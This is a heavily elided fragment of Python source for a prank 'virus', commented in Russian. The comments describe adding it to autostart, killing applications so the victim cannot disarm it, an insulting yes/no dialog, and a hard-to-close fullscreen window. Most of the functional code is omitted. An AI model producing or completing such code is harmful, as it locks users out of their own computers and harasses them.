...
while True:
    ...
    if result4 == 'Открыть':
     ...
     # Добавляем вирус в автозапуск и закрываем приложения навсегда (пока запущен вирус) чтобы пользователь не смог их открыть чтобы обезвредить вирус
     os.system("@echo off")
     ...
     # Перемещаем курсор в правый нижний угол экрана (По приколу)
     pyautogui.moveTo(screen_width, screen_height)
     # 1 окно с кнопками
     while True:
     # сам вопрос в вирусе и кнопки да и нет 
         result = pg.confirm('Ты лох?', buttons=['Да', 'Нет'])
     # А здесь создание условия что будет если пользователь пример(User) в вирусе нажмет на кнопку да или нет
         if result == 'Да':
     ...
     # а вот здесь перед запуском самого вируса запускаем окно с белым экраном на полноекранный режим который я написал в начале самой программы которое сложно закрыть чтобы пользователь пример(User) немного потрудился обезвредить сначало это!!!!!
     root.mainloop()
